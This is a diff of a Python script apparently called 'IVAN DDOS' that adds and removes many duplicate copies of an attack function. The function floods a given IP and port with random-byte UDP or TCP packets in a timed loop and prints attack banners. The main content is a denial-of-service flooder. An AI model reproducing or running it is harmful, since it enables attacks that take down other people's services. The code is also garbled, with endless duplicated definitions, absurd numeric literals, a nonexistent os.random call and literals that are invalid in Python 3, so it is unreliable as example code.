@@ -9183,7 +9157,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -9209,7 +9209,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -9235,33 +9235,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -9287,7 +9261,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -9313,7 +9313,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -9339,33 +9339,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -9391,7 +9365,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -9417,7 +9417,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -9443,33 +9443,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -9495,7 +9469,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -9521,7 +9521,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -9547,33 +9547,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -9599,7 +9573,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -9975,7 +9975,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -10007,7 +10007,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -10039,7 +10039,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -10071,7 +10071,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -10103,7 +10103,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -10129,7 +10129,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -10161,7 +10161,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -10193,7 +10193,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -10225,7 +10225,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -10257,7 +10257,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -10283,7 +10283,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -10314,7 +10314,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -10339,7 +10339,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -10370,7 +10370,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -10401,7 +10401,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -10432,7 +10432,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -10593,7 +10593,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -10618,32 +10618,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(91, 999999999)
-        threads = threads or os.random.randint(91, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(91, min(999999999, port))
-    if threads is not None:
-        threads = max(91, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -10668,7 +10643,32 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(91, 999999999)
+        threads = threads or os.random.randint(91, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(91, min(999999999, port))
+    if threads is not None:
+        threads = max(91, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -11589,7 +11589,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -11621,7 +11621,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -11653,7 +11653,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -11685,7 +11685,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -11717,7 +11717,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -11743,7 +11743,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -11775,39 +11775,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -11839,7 +11807,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -11871,415 +11839,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
